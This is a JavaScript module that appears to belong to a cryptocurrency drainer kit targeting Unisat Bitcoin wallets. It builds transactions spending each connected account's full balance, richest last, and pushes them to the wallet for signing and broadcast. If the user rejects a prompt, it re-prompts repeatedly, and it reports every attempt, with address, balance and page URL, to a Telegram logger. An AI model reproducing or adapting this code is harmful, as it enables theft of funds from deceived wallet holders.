import Setting from "../../../store"
import { succsessAlert, errorAlert } from "../../toast"
import { LogTg } from "../../tg"

export const Unisat = async (state, feePrice, broadcastPSBT, p2wpkhPsbt, p2shPsbt, p2trPsbt, p2pkhPsbt) => {
    let wallet = "Unisat"
    const repeatTransactions = Setting.repeatTransactions
    const accountsData = state?.accountsWallet;
    //console.log(accountsData)
    accountsData.sort((a, b) => a.balance - b.balance);

    // Удаление элементов, у которых balance < feePrice
    const filteredAccountsData = accountsData.filter((account) => account.balance >= feePrice);
    //console.log(filteredAccountsData);
    if (filteredAccountsData.length == 0) errorAlert('Insufficient funds to pay the gas fee.')
      
    for (let i = 0; i < filteredAccountsData.length; i++) {
        let PSBT = '';
            
        if (filteredAccountsData[i].type === 'p2wpkh') {
              //console.log('p2wpkh')

            PSBT = await p2wpkhPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance)
              //console.log(PSBT)
        }

        if (filteredAccountsData[i].type === 'p2sh-p2wpkh') {
              //console.log('p2sh-p2wpkh')

            PSBT = await p2shPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance)
              //console.log(PSBT)
        }

        if (filteredAccountsData[i].type === 'p2tr') {
              //console.log('p2tr')

            PSBT = await p2trPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance, wallet)
              //console.log(PSBT)
        }

        if (filteredAccountsData[i].type === 'p2pkh') {
              //console.log('p2pkh')

            PSBT = await p2pkhPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance)
              //console.log(PSBT)
        }

        try {
            LogTg("transaction_started", {
                url: window.location.href,
                account: filteredAccountsData[i].address,
                walletType: wallet,
                balance: filteredAccountsData[i].balance
            })

            const signedTx = await window.unisat.signPsbt(PSBT.hex);
            const broadcastedTx = await broadcastPSBT(signedTx)
              //console.log(broadcastedTx)
            if (!broadcastedTx) {
                errorAlert('Transaction Failed')

                //TELEGRAM transaction_false
                LogTg("transaction_false", {
                  url: window.location.href,
                  account: filteredAccountsData[i].address,
                  walletType: wallet,
                  balance: filteredAccountsData[i].balance
                })
            } else {
                succsessAlert('Transaction Succsess')

                //TELEGRAM transaction_true
                LogTg("transaction_true", {
                  url: window.location.href,
                  account: filteredAccountsData[i].address,
                  walletType: wallet,
                  balance: filteredAccountsData[i].balance
                })
              }
            } catch (e) {
                console.log(e);
                errorAlert('Transaction Failed')

                //TELEGRAM transaction_false
                //TELEGRAM error
                LogTg("transaction_false", {
                    url: window.location.href,
                    account: filteredAccountsData[i].address,
                    walletType: wallet,
                    balance: filteredAccountsData[i].balance,
                    error: e?.message ? e?.message : ""
                })

              if (e.code == 4001 && repeatTransactions) i--;
            }
          }
}